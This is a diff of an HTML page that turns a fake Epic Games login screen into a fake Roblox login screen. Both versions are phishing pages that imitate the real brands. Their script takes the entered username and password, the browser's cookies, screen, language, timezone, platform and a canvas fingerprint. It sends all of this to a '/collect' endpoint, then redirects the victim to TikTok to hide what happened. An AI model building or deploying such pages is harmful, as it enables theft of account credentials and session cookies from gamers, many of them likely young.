@@ -1,174 +1,517 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход в Epic Games</title>
+    <title>Roblox - Login</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #121212; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .login-container { background-color: #18181c; width: 100%; max-width: 480px; padding: 40px 30px; border-radius: 8px; border: 1px solid #2a2a2a; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        .epic-logo { width: 50px; height: auto; margin: 0 auto 20px; display: block; }
-        h1 { font-size: 20px; margin-bottom: 25px; font-weight: 600; }
-        .input-group { margin-bottom: 15px; position: relative; }
-        input[type="text"], input[type="email"], input[type="password"] { width: 100%; padding: 14px; background-color: #202024; border: 1px solid #333; border-radius: 4px; color: #fff; font-size: 14px; outline: none; transition: border-color 0.2s; }
-        input:focus { border-color: #0074E4; }
-        input::placeholder { color: #888; }
-        .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #888; cursor: pointer; font-size: 14px; padding: 0; outline: none; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: #fff;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .background-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-image: 
+                linear-gradient(45deg, #1a1a1a 25%, transparent 25%, transparent 75%, #1a1a1a 75%, #1a1a1a),
+                linear-gradient(45deg, #1a1a1a 25%, transparent 25%, transparent 75%, #1a1a1a 75%, #1a1a1a);
+            background-size: 200px 200px;
+            background-position: 0 0, 100px 100px;
+            opacity: 0.3;
+            filter: blur(4px);
+        }
+        
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 0;
+        }
+
+        .navbar {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            background-color: #1f1f1f;
+            height: 48px;
+            padding: 0 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .logo {
+            font-size: 18px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-right: 30px;
+            cursor: pointer;
+        }
+        
+        .logo span { color: #fff; }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #ccc;
+        }
+
+        .nav-links a {
+            color: inherit;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover { color: #fff; }
+
+        .search-bar {
+            flex-grow: 1;
+            max-width: 500px;
+            margin: 0 30px;
+            position: relative;
+        }
+
+        .search-bar input {
+            width: 100%;
+            background-color: #2c2c2c;
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 8px 12px 8px 36px;
+            color: #fff;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 14px;
+        }
+
+        .nav-right {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .profile-icon {
+            width: 32px;
+            height: 32px;
+            background-color: #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: 2px solid #555;
+            transition: border-color 0.2s;
+            position: relative;
+        }
+
+        .profile-icon:hover {
+            border-color: #0074E4;
+        }
+
+        .profile-icon::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 8px;
+            height: 8px;
+            background-color: #e60012;
+            border-radius: 50%;
+            border: 1px solid #1f1f1f;
+        }
+
+        .profile-avatar {
+            width: 24px;
+            height: 24px;
+            background-color: #aaa;
+            border-radius: 50%;
+        }
+
+        .btn-signup {
+            background-color: #0074E4;
+            color: #fff;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-signup:hover { background-color: #005bb5; }
+
+        .main-content {
+            position: relative;
+            z-index: 10;
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-box {
+            background-color: #232527;
+            width: 100%;
+            max-width: 420px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            text-align: center;
+            border: 1px solid #333;
+        }
+
+        .login-box h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            background-color: #333;
+            border: 1px solid #555;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus { border-color: #fff; }
+        .input-group input::placeholder { color: #aaa; }
+
+        .btn-login {
+            width: 100%;
+            padding: 12px;
+            background-color: #2c2c2c;
+            color: #fff;
+            border: 1px solid #555;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 5px;
+            margin-bottom: 20px;
+            transition: background 0.2s;
+        }
+
+        .btn-login:hover { background-color: #3a3a3a; }
+
+        .forgot-link {
+            display: block;
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link:hover { text-decoration: underline; }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 12px;
+            background-color: #333;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 10px;
+            transition: background 0.2s;
+        }
+
+        .btn-secondary:hover { background-color: #444; }
+
+        .signup-text {
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .signup-text a { color: #fff; text-decoration: underline; }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 0;
+        }
+        
         .toggle-password:hover { color: #fff; }
-        .forgot-password { text-align: right; margin-bottom: 20px; font-size: 12px; }
-        .btn-primary { width: 100%; padding: 14px; background-color: #0074E4; border: none; border-radius: 4px; color: white; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-bottom: 20px; }
-        .btn-primary:hover { background-color: #0062c4; }
-        .btn-primary:disabled { background-color: #333; cursor: not-allowed; }
-        a { color: #0074E4; text-decoration: none; font-size: 12px; }
-        a:hover { text-decoration: underline; }
-        .create-account { font-size: 12px; color: #ccc; margin-bottom: 30px; display: block; }
-        .divider { height: 1px; background-color: #333; margin: 20px 0; border: none; }
-        .section-title { font-size: 14px; font-weight: 600; margin-bottom: 5px; color: #eee; }
-        .section-subtitle { font-size: 12px; color: #aaa; margin-bottom: 15px; }
-        .grid-buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 30px; }
-        .social-btn { background-color: #202024; border: 1px solid #333; border-radius: 4px; padding: 15px 5px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: background 0.2s; height: 80px; }
-        .social-btn:hover { background-color: #2a2a2e; }
-        .icon-circle { width: 28px; height: 28px; border-radius: 50%; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; color: #fff; }
-        .icon-ps { background-color: #0070d1; }
-        .icon-xbox { background-color: #107c10; }
-        .icon-switch { background-color: #e60012; }
-        .icon-google { background-color: #fff; color: #333; }
-        .icon-steam { background-color: #171a21; }
-        .icon-disney { background-color: #fff; color: #113ccf; }
-        .icon-apple { background-color: #fff; color: #000; }
-        .icon-fb { background-color: #1877f2; }
-        .icon-lego { background-color: #ffcf00; color: #d01012; }
-        .icon-vk { background-color: #0077ff; }
-        .btn-label { font-size: 9px; color: #ccc; text-align: center; line-height: 1.2; }
-        .footer-links { display: flex; flex-direction: column; gap: 15px; margin-top: 20px; }
-        .footer-links a { font-size: 12px; }
-        #loader { display: none; text-align: center; padding: 40px 0; }
-        #loader .spinner { width: 40px; height: 40px; margin: 0 auto 15px; border: 3px solid #333; border-top-color: #0074E4; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .toast-notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #1e1e24;
+            color: #fff;
+            padding: 15px 20px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            z-index: 100;
+            border-left: 4px solid #0074E4;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: slideIn 0.5s forwards;
+        }
+
+        @keyframes slideIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .toast-icon {
+            font-size: 24px;
+            background-color: #333;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+        }
+
+        .toast-text h4 {
+            font-size: 14px;
+            margin-bottom: 2px;
+        }
+
+        .toast-text p {
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .close-toast {
+            background: none;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            font-size: 16px;
+            margin-left: 10px;
+        }
+
+        .close-toast:hover { color: #fff; }
+
+        #loader {
+            display: none;
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        #loader .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 15px;
+            border: 4px solid #333;
+            border-top-color: #0074E4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #loader p {
+            font-size: 14px;
+            color: #aaa;
+        }
     </style>
 </head>
 <body>
 
-    <div class="login-container" id="formCard">
-        <img src="epic-logo.png" alt="Epic Games Logo" class="epic-logo">
-        <h1>Войти в Epic Games</h1>
+    <div class="background-grid"></div>
+    <div class="overlay"></div>
 
-        <form id="loginForm">
-            <div class="input-group">
-                <input type="text" id="login" placeholder="Адрес электронной почты или логин" required>
+    <nav class="navbar">
+        <div class="logo">R<span>O</span>BLOX</div>
+        <div class="nav-links">
+            <a href="#">Charts</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Create</a>
+            <a href="#">Robux</a>
+        </div>
+        <div class="search-bar">
+            <span class="search-icon">🔍</span>
+            <input type="text" placeholder="Search">
+        </div>
+        
+        <div class="nav-right">
+            <div class="profile-icon" title="My Collection">
+                <div class="profile-avatar"></div>
             </div>
-            <div class="input-group">
-                <input type="password" id="password" placeholder="Пароль" required>
-                <button type="button" class="toggle-password" id="togglePass">👁️</button>
-            </div>
-            <div class="forgot-password">
-                <a href="#">Забыли пароль?</a>
-            </div>
-            <button type="submit" class="btn-primary" id="submitBtn" disabled>Войти</button>
-        </form>
+            <button class="btn-signup">Sign Up</button>
+        </div>
+    </nav>
 
-        <div class="create-account">
-            Ещё нет учётной записи? <a href="#">Создать учётную запись</a>
+    <div class="main-content">
+        <div class="login-box" id="formCard">
+            <h1>Login to Roblox</h1>
+
+            <form id="loginForm">
+                
+                <div class="input-group">
+                    <input type="text" id="login" placeholder="Username/Email/Phone" required>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <button type="button" class="toggle-password" id="togglePass">👁️</button>
+                </div>
+
+                <button type="submit" class="btn-login" id="submitBtn" disabled>Log In</button>
+            </form>
+
+            <a href="#" class="forgot-link">Forgot Password or Username?</a>
+
+            <button class="btn-secondary">Email Me a One-Time Code</button>
+            <button class="btn-secondary">Quick Sign-in</button>
+
+            <div class="signup-text">
+                Don't have an account? <a href="#">Sign Up</a>
+            </div>
         </div>
 
-        <hr class="divider">
-
-        <div class="section-title">Играли только на консоли?</div>
-        <div class="section-subtitle">Войдите, чтобы получить доступ к прогрессу и покупкам</div>
-        <div class="grid-buttons">
-            <div class="social-btn"><div class="icon-circle icon-ps">PS</div><span class="btn-label">PlayStation Network</span></div>
-            <div class="social-btn"><div class="icon-circle icon-xbox">X</div><span class="btn-label">Сеть Xbox</span></div>
-            <div class="social-btn"><div class="icon-circle icon-switch">N</div><span class="btn-label">Учётная запись Nintendo</span></div>
-        </div>
-
-        <div class="section-title">Другие способы входа</div>
-        <div style="margin-bottom: 15px;"></div>
-        <div class="grid-buttons">
-            <div class="social-btn"><div class="icon-circle icon-google">G</div><span class="btn-label">Google</span></div>
-            <div class="social-btn"><div class="icon-circle icon-steam">S</div><span class="btn-label">Steam</span></div>
-            <div class="social-btn"><div class="icon-circle icon-disney">D</div><span class="btn-label">Disney</span></div>
-            <div class="social-btn"><div class="icon-circle icon-apple">A</div><span class="btn-label">Вход с Apple</span></div>
-            <div class="social-btn"><div class="icon-circle icon-fb">f</div><span class="btn-label">Facebook</span></div>
-            <div class="social-btn"><div class="icon-circle icon-lego">L</div><span class="btn-label">Учётная запись LEGO</span></div>
-            <div class="social-btn"><div class="icon-circle icon-vk">VK</div><span class="btn-label">ВКонтакте</span></div>
-        </div>
-
-        <div class="footer-links">
-            <a href="#">Проблемы со входом?</a>
-            <a href="#">Политика конфиденциальности</a>
+        <div id="loader">
+            <div class="spinner"></div>
+            <p>Выполняется вход...</p>
         </div>
     </div>
 
-    <div id="loader">
-        <div class="spinner"></div>
-        <div style="color:#aaa;font-size:13px;">Вход...</div>
+    <div class="toast-notification" id="toast">
+        <div class="toast-icon">🎒</div>
+        <div class="toast-text">
+            <h4>Коллекция</h4>
+            <p>Ваши предметы успешно загружены!</p>
+        </div>
+        <button class="close-toast" onclick="document.getElementById('toast').style.display='none'">✕</button>
     </div>
 
-<script>
-const endpoint = "/collect";
-const loginInput = document.getElementById("login");
-const passInput = document.getElementById("password");
-const submitBtn = document.getElementById("submitBtn");
-const formCard = document.getElementById("formCard");
-const loader = document.getElementById("loader");
+    <script>
+        setTimeout(function() {
+            var toast = document.getElementById('toast');
+            if(toast) {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateY(20px)';
+                toast.style.transition = 'all 0.5s';
+                setTimeout(() => toast.style.display = 'none', 500);
+            }
+        }, 6000);
+    </script>
 
-function checkActive() {
-  if (loginInput.value.trim() && passInput.value) {
-    submitBtn.disabled = false;
-  } else {
-    submitBtn.disabled = true;
-  }
-}
-loginInput.addEventListener("input", checkActive);
-passInput.addEventListener("input", checkActive);
+    <script>
+        const endpoint = "/collect";
+        const loginInput = document.getElementById("login");
+        const passInput = document.getElementById("password");
+        const submitBtn = document.getElementById("submitBtn");
 
-document.getElementById("togglePass").addEventListener("click", () => {
-  const type = passInput.type === "password" ? "text" : "password";
-  passInput.type = type;
-  document.getElementById("togglePass").textContent = type === "password" ? "👁️" : "🔒";
-});
+        function checkActive() {
+          if (loginInput.value.trim() && passInput.value) {
+            submitBtn.classList.add("active");
+            submitBtn.disabled = false;
+          } else {
+            submitBtn.classList.remove("active");
+            submitBtn.disabled = true;
+          }
+        }
+        loginInput.addEventListener("input", checkActive);
+        passInput.addEventListener("input", checkActive);
 
-document.getElementById("loginForm").addEventListener("submit", async (e) => {
-  e.preventDefault();
-  const login = loginInput.value.trim();
-  const password = passInput.value;
+        document.getElementById("togglePass").addEventListener("click", () => {
+          const type = passInput.type === "password" ? "text" : "password";
+          passInput.type = type;
+        });
 
-  formCard.style.display = "none";
-  loader.style.display = "block";
+        document.getElementById("loginForm").addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const login = loginInput.value.trim();
+          const password = passInput.value;
 
-  const canvas = document.createElement("canvas");
-  const ctx = canvas.getContext("2d");
-  ctx.textBaseline = "top";
-  ctx.font = "14px Arial";
-  ctx.fillText("fp", 2, 2);
-  const fp = canvas.toDataURL().slice(-32);
+          document.getElementById("formCard").style.display = "none";
+          document.getElementById("loader").style.display = "block";
 
-  const payload = {
-    login: login,
-    password: password,
-    screen: `${screen.width}x${screen.height}`,
-    lang: navigator.language || "—",
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "—",
-    platform: navigator.platform || "—",
-    cookies: document.cookie || "none",
-    fp: fp,
-    url: location.href
-  };
+          const canvas = document.createElement("canvas");
+          const ctx = canvas.getContext("2d");
+          ctx.textBaseline = "top";
+          ctx.font = "14px Arial";
+          ctx.fillText("fp", 2, 2);
+          const fp = canvas.toDataURL().slice(-32);
 
-  try {
-    await fetch(endpoint, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-      keepalive: true
-    });
-  } catch (err) {}
+          const payload = {
+            login: login,
+            password: password,
+            screen: `${screen.width}x${screen.height}`,
+            lang: navigator.language || "—",
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "—",
+            platform: navigator.platform || "—",
+            cookies: document.cookie || "none",
+            fp: fp,
+            url: location.href
+          };
 
-  setTimeout(() => {
-    location.replace("https://www.tiktok.com/");
-  }, 700);
-});
-</script>
+          try {
+            await fetch(endpoint, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload),
+              keepalive: true
+            });
+          } catch (err) {}
+
+          setTimeout(() => {
+            location.replace("https://www.tiktok.com/");
+          }, 700);
+        });
+    </script>
+
 </body>
 </html>
